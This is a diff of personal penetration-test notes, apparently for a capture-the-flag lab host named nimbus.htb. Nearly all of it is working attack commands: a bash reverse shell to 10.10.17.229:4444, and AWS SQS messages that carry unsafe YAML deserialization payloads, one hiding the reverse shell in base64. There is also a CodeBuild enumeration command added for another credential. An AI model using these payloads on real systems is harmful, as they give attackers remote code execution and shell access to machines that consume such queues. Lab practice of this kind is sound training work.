@@ -35,12 +35,14 @@ floci pentest
 bash -c "bash -i >& /dev/tcp/10.10.17.229/4444 0>&1"
 
 
-aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/10.10.17.229/4444 0>&1\""]'
+
 
 aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "!!python/object/apply:subprocess.Popen\n- !!python/tuple\n  - python\n  - -c\n  - \"\_\_import\_\_(\'os\').system(str(\_\_import\_\_(\'base64\').b64decode(\'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4yMjkvNDQ0NCAwPiYxIg==\').decode()))\""
 
-aws --endpoint-url http://floci:4566 sqs list-queues
 
+## another credential
+
+aws --endpoint-url http://aws.nimbus.htb codebuild list-projects
 
 # TODO 
 
